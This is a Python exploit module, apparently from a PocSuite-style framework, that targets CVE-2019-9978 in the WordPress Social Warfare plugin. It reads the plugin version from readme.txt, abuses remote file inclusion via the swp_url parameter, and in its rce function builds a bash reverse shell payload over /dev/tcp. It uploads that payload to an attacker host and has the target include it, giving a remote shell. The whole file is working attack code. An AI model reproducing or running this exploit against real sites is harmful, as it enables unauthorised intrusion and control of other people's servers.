import requests 
import re
from Framework.Library.Function.Function.PocSuite.api import paths

class warfare_rce: 
    def __init__(self, url): 
        self.url = url
        
    def check_version(self): 
        url  = self.url + "/wp-content/plugins/social-warfare/readme.txt"
        resp = requests.get(url, verify=False)
        fixed_version = "3.5.3" 
        try: 
            match = re.findall(
                r'== Changelog ==\n\n= ([0-9]+\.[0-9]+\.[0-9])',
                str(resp.text)
            )
            if(match[0]) < fixed_version: 
                return True
            else: 
                return False
        except: return False
    def exploit(self, url_rfi): 
        
        r = requests.get(self.url + "/wp-admin/admin-post.php?rce=id&swp_debug=load_options&swp_url=" + url_rfi, timeout=5)

        
        return r.text    

def verify(url): 
    result = warfare_rce(url)
    return result.check_version()

def exploit(url, url_for_rfi): 
    result = warfare_rce(url)
    url_rfi = url_for_rfi + "/cve/download/cve-2019-9978-attack.txt"
    check_for_attack = result.exploit(url_rfi)
    if "test cve-2019-9978 successfully!!!" in check_for_attack: 
        return True
    else: 
        return False
        

def rce(shell_url, lhost, lport, host_for_rfi): 
    shell = '''<pre>
    system("/bin/bash -c 'bash -i >&/dev/tcp/{}/{} 0>&1'");
    </pre>'''.format(lhost, lport)
    temp = warfare_rce(shell_url)
    with open(paths.POCSUITE_ROOT_PATH+ "/init_pocs/cve_2019_9978/cve-2019-9978-shell.txt", "wb") as file:
        file.write( str.encode(shell))
        file.close()
    files={
        "file_upload": open(paths.POCSUITE_ROOT_PATH+ "/init_pocs/cve_2019_9978/cve-2019-9978-shell.txt", "rb")
    }
    requests.post(host_for_rfi + "/upload", files=files)
    temp.exploit(host_for_rfi + "/cve/download/cve-2019-9978-shell.txt")
    return True